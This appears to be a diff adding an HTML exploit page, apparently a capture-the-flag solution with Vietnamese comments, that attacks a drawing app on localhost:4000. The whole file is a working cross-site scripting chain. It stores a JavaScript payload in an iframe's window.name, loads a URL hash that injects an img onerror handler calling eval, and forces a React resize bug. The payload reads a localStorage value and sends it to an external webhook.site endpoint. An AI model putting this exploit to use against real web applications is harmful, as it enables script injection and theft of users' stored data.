@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Live Art</title>
+</head>
+<body>
+    <iframe src="about:blank" id="exploitFrame" style="width: 10px; height: 500px; border: none;"></iframe>
+
+    <script>
+        // BƯỚC 1: Điền URL Webhook.site của bạn để nhận Flag ở đây
+        const EXFIL_SERVER = "https://webhook.site/0a84fa24-d4f3-4e1c-8ef0-42cd755a0922"; 
+        
+        // BƯỚC 2: Bắt buộc giữ nguyên localhost:4000 vì Bot lưu trữ Flag tại đây
+        const TARGET_SERVER = "http://localhost:4000"; 
+
+        const frame = document.getElementById("exploitFrame");
+
+        // Ghi mã độc vào thuộc tính window.name của iframe để giữ lại sau khi chuyển hướng sang domain khác
+        // Chuỗi payload phẳng, không chứa ký tự xuống dòng hay dấu backtick phức tạp để tránh lỗi cú pháp
+        frame.contentWindow.name = "const flag = localStorage.getItem('username'); if (flag) { new Image().src = '" + EXFIL_SERVER + "/?flag=' + encodeURIComponent(flag); }";
+
+        // BƯỚC 3: Chuyển hướng iframe tới đường dẫn đích chứa lỗi kèm tham số Hash độc hại
+        setTimeout(function() {
+            frame.src = TARGET_SERVER + "/drawing/pwn#src=none&onerror=eval(window.name)&is=img";
+        }, 2000);
+
+        // BƯỚC 4: Phóng to kích thước iframe lên 1200px để kích hoạt sự kiện resize động trong React
+        // Việc này ép xảy ra lỗi State Teleportation, nạp payload từ Hash URL vào thẻ <img>
+        setTimeout(function() {
+            frame.style.width = "1200px";
+        }, 5000);
+    </script>
+</body>
+</html>
